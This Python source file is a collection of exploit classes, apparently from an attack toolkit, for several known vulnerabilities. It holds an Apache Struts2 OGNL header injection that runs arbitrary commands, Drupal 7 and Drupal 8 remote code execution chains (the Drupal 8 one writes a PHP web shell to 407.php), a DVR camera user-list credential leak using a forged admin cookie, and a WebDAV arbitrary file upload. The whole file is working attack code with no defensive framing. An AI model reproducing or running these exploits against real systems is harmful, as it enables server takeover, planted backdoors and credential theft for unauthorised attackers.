#-*- coding: utf-8 -*-
import requests,re
from bs4 import BeautifulSoup as bs

class apache_struts2_rce(object):

      def strutsRCE(self,target,cmd):
          self.target = target
          self.cmd = cmd
          payload = "%{(#_='multipart/form-data')."
          payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
          payload += "(#_memberAccess?"
          payload += "(#_memberAccess=#dm):"
          payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
          payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
          payload += "(#ognlUtil.getExcludedPackageNames().clear())."
          payload += "(#ognlUtil.getExcludedClasses().clear())."
          payload += "(#context.setMemberAccess(#dm))))."
          payload += "(#cmd='%s')." % self.cmd
          payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
          payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
          payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
          payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
          payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
          payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
          payload += "(#ros.flush())}"
          headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
          res = requests.post(self.target,headers=headers)
          return res.text

class drupal_version7_rce(object):

      def v7(self,target,command):
          self.target = target
          self.command = command
          r = requests.post(
              self.target,
              params = {
                 'q':'user/password', 
                 'name[#post_render][]':'passthru', 
                 'name[#type]':'markup', 
                 'name[#markup]': self.command
                 },
              data = {
                 'form_id':'user_pass', 
                 '_triggering_element_name':'name', 
                 '_triggering_element_value':'', 
                 'opz':'E-mail new Password'
                }
              )
          bid = bs(r.text,'html.parser')
          sop = bid.find(
            'form',{
                'id':'user-pass'
            }
          )
          build_id = sop.find('input', {'name': 'form_build_id'}).get('value')
          resp = requests.post(
            self.target,
            params = {
                'q':'file/ajax/name/#value/' + build_id
            },
            data = {
                'form_build_id':build_id
            }
          )
          x = resp.text.split('[{"command":"settings"')
          return x

class drupal_version8_rce(object):

      def v8(self,target):
          self.target = target
          payload = "<?php system($_GET['cmd']); ?>"
          pilod = 'echo ' + "'" + payload + "'" + '>> 407.php'
          r = requests.post(
            self.target,
            data = {
               'form_id':'user_register_form',       
                '_drupal_ajax': '1', 
                'mail[#post_render][]':'exec', 
                'mail[#type]': 'markup',
                'mail[#markup]':pilod
            }
          )
          cek = requests.get(f'{self.target}/407.php')
          if cek.status_code == 200:
             return True
          else:
             return None
             
class dvr_cam_leak_credential(object):

      def exploit(self,target):
          self.target = target
          r = requests.get(
            f'{self.target}/device.rsp?opt=user&cmd=list',
            headers = {
                'Host':self.target,
                'User-Agent':'Morzilla/7.0 (911; Linux x86_128; rv:9743.0)',
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;>',
                'Accept-Language':'es-AR,en-US;q=0.7,en;q=0.3',
                'Connection':'close',
                'Content-Type':'text/html',
                'Cookie':'uid=admin'
            }
          )          
          if r.status_code == 200:
             return r.json()
          else:
             return 'Not Vuln'

class webdav_file_upload(object):


      def webdav(self,target,path_file,name_file):
          self.target = target
          self.path_file = path_file
          self.name_file = name_file
          r = requests.put(
            f'{self.target}/{self.name_file}',
            data = open(self.path_file,'rb').read(),
            headers = {
                'Content-Type':'application/octet-stream'
            }
          )
          cek = requests.get(f'{self.target}/{self.name_file}')
          return cek.status_code,cek.url          